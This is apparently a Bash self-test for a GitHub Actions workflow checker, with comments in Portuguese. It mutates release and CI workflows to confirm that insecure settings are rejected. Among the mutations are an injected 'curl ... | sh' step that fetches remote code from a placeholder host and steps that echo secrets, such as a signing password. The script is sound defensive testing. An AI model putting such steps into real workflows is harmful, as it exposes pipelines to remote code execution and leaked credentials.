#!/usr/bin/env bash
# Autoteste do check-workflows.sh: o release.yml real passa, e cada mutação perigosa é reprovada.
# shellcheck disable=SC2016 # as expressões perl levam $1 literal
set -euo pipefail
cd "$(dirname "$0")/.."
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
fail() { echo "FALHOU (check-workflows): $*" >&2; exit 1; }

./scripts/check-workflows.sh >/dev/null 2>&1 || fail "os workflows reais foram reprovados: $(./scripts/check-workflows.sh 2>&1)"

# mut NOME 'perl-expr' : copia os workflows, aplica a mutação (perl, igual em macOS e Linux) no release.yml e
# exige reprovação
mut() {
  local name="$1" expr="$2" d="$tmp/$1"
  mkdir -p "$d"
  cp .github/workflows/*.yml "$d/"
  perl -0777 -pe "$expr" .github/workflows/release.yml >"$d/release.yml"
  cmp -s .github/workflows/release.yml "$d/release.yml" && fail "mutação '$name' não alterou nada (expressão errada)"
  ./scripts/check-workflows.sh "$d" >"$tmp/o" 2>&1 && fail "mutação '$name' foi aceita"
  return 0
}
mut pull_request 's/^on:\n/on:\n  pull_request:\n    branches: [main]\n/m'
mut dispatch 's/^on:\n/on:\n  workflow_dispatch:\n/m'
mut branch-push 's/^    tags:\n/    branches: [main]\n    tags:\n/m'
mut sha-solto 's/actions\/setup-go\@[0-9a-f]{40}/actions\/setup-go\@v5/'
mut sem-comentario 's/(actions\/upload-artifact\@[0-9a-f]{40}) # v[0-9.]+/$1/'
mut sem-timeout 's/^    timeout-minutes: .*\n//m'
mut cred-persistida 's/persist-credentials: false/persist-credentials: true/'
mut permissao-topo 's/^permissions: \{\}\n/permissions:\n  contents: read\n/m'
mut dois-writes 's/^      contents: read\n/      contents: write\n/m'
mut cancela 's/cancel-in-progress: false/cancel-in-progress: true/'
mut sem-environment 's/^    environment: release\n//m'
mut sem-draft 's/ --draft//'
mut sem-verify-tag 's/ --verify-tag//'
mut ptarget 's/^on:\n/on:\n  pull_request_target:\n/m'
mut curl-sh 's/(\.\/scripts\/ci\.sh\n)/$1      - run: curl -fsSL https:\/\/exemplo.invalid\/x | sh\n/'
mut eco-segredo 's/(          \.\/scripts\/release-sign-macos\.sh --dir dist\n)/$1          echo "\$DEVELOPER_ID_P12_PASSWORD"\n/'

mut macos-latest 's/runs-on: macos-15[^\n]*/runs-on: macos-latest/'
mut sem-cache-false 's/^          cache: false[^\n]*\n//m'
mut larger-runner 's/runs-on: ubuntu-latest/runs-on: ubuntu-latest-xl/'
mut self-hosted 's/runs-on: ubuntu-latest/runs-on: self-hosted/'

# ci.yml: mutações reprovadas (valida PR e push, sem segredo, sem escrita, runners padrão)
mutci() {
  local name="$1" expr="$2" d="$tmp/ci-$1"
  mkdir -p "$d"
  cp .github/workflows/*.yml "$d/"
  perl -0777 -pe "$expr" .github/workflows/ci.yml >"$d/ci.yml"
  cmp -s .github/workflows/ci.yml "$d/ci.yml" && fail "mutação do ci '$name' não alterou nada (expressão errada)"
  ./scripts/check-workflows.sh "$d" >"$tmp/o" 2>&1 && fail "mutação do ci '$name' foi aceita"
  return 0
}
mutci sem-pull-request 's/^  pull_request:\n    paths-ignore:\n(      - .*\n)+//m'
mutci sem-push 's/^  push:\n    branches: \[main\]\n    paths-ignore:\n(      - .*\n)+//m'
mutci push-de-qualquer-branch 's/branches: \[main\]/branches: ["**"]/'
mutci segredo 's/(      - name: gate\n)/      - run: echo \$\{\{ secrets.QUALQUER \}\}\n$1/'
mutci environment 's/(    timeout-minutes: 30\n)/$1    environment: release\n/'
mutci escrita 's/^  contents: read\n/  contents: write\n/m'
mutci sem-concurrency 's/^concurrency:\n.*\n.*\n//m'
mutci pull-request-target 's/^on:\n/on:\n  pull_request_target:\n/m'
mutci larger-runner 's/os: \[ubuntu-latest, macos-latest, windows-latest\]/os: [ubuntu-latest-xl, macos-latest, windows-latest]/'
mutci sha-solto 's/actions\/checkout\@[0-9a-f]{40}/actions\/checkout\@v4/'

# pull_request fora do ci.yml é reprovado (um workflow qualquer com pull_request)
mkdir -p "$tmp/outro"; cp .github/workflows/*.yml "$tmp/outro/"
cat >"$tmp/outro/lint.yml" <<'YML'
name: lint
on:
  pull_request:
permissions:
  contents: read
jobs:
  l:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          persist-credentials: false
YML
./scripts/check-workflows.sh "$tmp/outro" >"$tmp/o" 2>&1 && fail "pull_request em outro workflow foi aceito"
grep -q 'pull_request só é permitido no ci.yml' "$tmp/o" || fail "mensagem: $(cat "$tmp/o")"

echo "ok check-workflows_test"
